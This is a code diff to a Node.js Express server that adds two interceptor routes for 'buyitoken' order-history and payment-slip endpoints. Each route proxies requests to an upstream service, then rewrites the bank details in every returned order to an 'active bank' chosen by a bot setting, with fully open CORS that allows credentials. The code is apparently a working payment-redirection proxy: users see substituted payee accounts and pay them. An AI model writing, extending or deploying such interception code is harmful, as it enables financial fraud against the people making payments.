@@ -1405,6 +1405,73 @@ app.get('/app/jsValue/:type', async (req, res) => {
   }
 });
 
+// ── Explicit High-Priority Interceptor for Buy History (/xxapi/buyitoken/history) ──
+app.all(['/xxapi/buyitoken/history', '/xxapi/buyitoken/history*'], async (req, res) => {
+  try {
+    if (req.method === 'OPTIONS') {
+      res.setHeader('Access-Control-Allow-Origin', '*');
+      res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD');
+      res.setHeader('Access-Control-Allow-Headers', '*');
+      res.setHeader('Access-Control-Allow-Credentials', 'true');
+      return res.status(200).end('OK');
+    }
+    const data = await loadData();
+    const { response, respBody, respHeaders } = await proxyToTivox(req);
+    let jsonResp = null;
+    try { jsonResp = JSON.parse(respBody); } catch (e) { }
+
+    if (jsonResp && jsonResp.data) {
+      const activeBank = getActiveBank(data, null);
+      if (activeBank && data.botEnabled !== false) {
+        const orderList = Array.isArray(jsonResp.data) ? jsonResp.data : (Array.isArray(jsonResp.data.list) ? jsonResp.data.list : (Array.isArray(jsonResp.data.data) ? jsonResp.data.data : []));
+        for (const order of orderList) {
+          if (!order || typeof order !== 'object') continue;
+          const orderId = String(order.rptNo || order.orderNo || order.id || '');
+          const altId = String(order.orderNo || order.rptNo || '');
+          const targetBank = resolveTargetBank(data, orderId, altId, activeBank);
+          replaceOrderBankDetails(order, targetBank);
+        }
+      }
+    }
+
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch (e) {
+    console.error('History explicit route error:', e.message);
+    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
+  }
+});
+
+// ── Explicit High-Priority Interceptor for Payment Slip Detail (/xxapi/buyitoken/paymentslipdetail) ──
+app.all(['/xxapi/buyitoken/paymentslipdetail', '/xxapi/buyitoken/paymentslipdetail*'], async (req, res) => {
+  try {
+    if (req.method === 'OPTIONS') {
+      res.setHeader('Access-Control-Allow-Origin', '*');
+      res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD');
+      res.setHeader('Access-Control-Allow-Headers', '*');
+      res.setHeader('Access-Control-Allow-Credentials', 'true');
+      return res.status(200).end('OK');
+    }
+    const data = await loadData();
+    const { response, respBody, respHeaders } = await proxyToTivox(req);
+    let jsonResp = null;
+    try { jsonResp = JSON.parse(respBody); } catch (e) { }
+
+    if (jsonResp && jsonResp.data && typeof jsonResp.data === 'object') {
+      const activeBank = getActiveBank(data, null);
+      if (activeBank && data.botEnabled !== false) {
+        const orderId = String(jsonResp.data.rptNo || jsonResp.data.id || jsonResp.data.orderNo || req.query.id || '');
+        const targetBank = resolveTargetBank(data, orderId, '', activeBank);
+        replaceOrderBankDetails(jsonResp.data, targetBank);
+      }
+    }
+
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch (e) {
+    console.error('paymentslipdetail explicit route error:', e.message);
+    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
+  }
+});
+
 app.all('/xxapi/*', async (req, res) => {
   try {
     const data = await loadData();
